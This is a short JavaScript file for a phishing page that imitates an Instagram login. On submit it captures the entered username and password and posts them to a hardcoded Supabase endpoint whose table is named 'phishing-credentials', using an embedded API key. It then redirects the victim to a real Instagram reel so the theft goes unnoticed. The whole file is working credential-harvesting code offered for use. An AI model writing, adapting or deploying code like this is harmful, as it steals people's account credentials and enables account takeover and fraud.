let form = document.getElementById('login-post');


const supabaseApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVmZHlrcmptamVhbnlnZ2dwcHBqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzMyNTcyOTQsImV4cCI6MjA0ODgzMzI5NH0.vPC1NJ_SNcgwRylxq7ARd3wA85_qSDCwh75gEN4toD8";
const supabaseEndpoint = "https://ufdykrjmjeanygggpppj.supabase.co/rest/v1/phishing-credentials";

form.addEventListener('submit', async (event) => {
    event.preventDefault();

    const username = event.target.username.value;
    const password = event.target.password.value;

    await fetch(supabaseEndpoint, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'apiKey': supabaseApiKey,
            'Authorization': `Bearer ${supabaseApiKey}`
        },
        body: JSON.stringify({
            username: username, 
            password: password
        })
    });

    let reelId = (new URLSearchParams(window.location.search)).get('reel');

    location.replace(`https://instagram.com/reel/${reelId}`);
});